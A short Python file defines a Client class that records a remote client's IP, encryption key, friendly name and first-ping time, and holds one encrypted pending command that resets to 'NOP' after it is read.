from utils.encrypt import encrypt_decrypt
import friendlywords as fw
import time

class Client:
    def __init__(self, ip: str, key: str):
        self.ip = ip
        self.encryption_key = key
        self.friendly_name = fw.generate('po', separator='-')
        self.set_cmd("NOP")
        self.first_ping_timestamp = time.time()
    
    def read_cmd_and_clear(self):   
        cmd = self.cmd
        self.set_cmd("NOP")
        return cmd
    
    def set_cmd(self, cmd:str):
        self._set_encrypted_cmd(cmd)
    
    def _set_encrypted_cmd(self, cmd: str):
        self.cmd = encrypt_decrypt(cmd,self.encryption_key)
        
    
    def set_ip(self, ip: str):
        self.ip = ip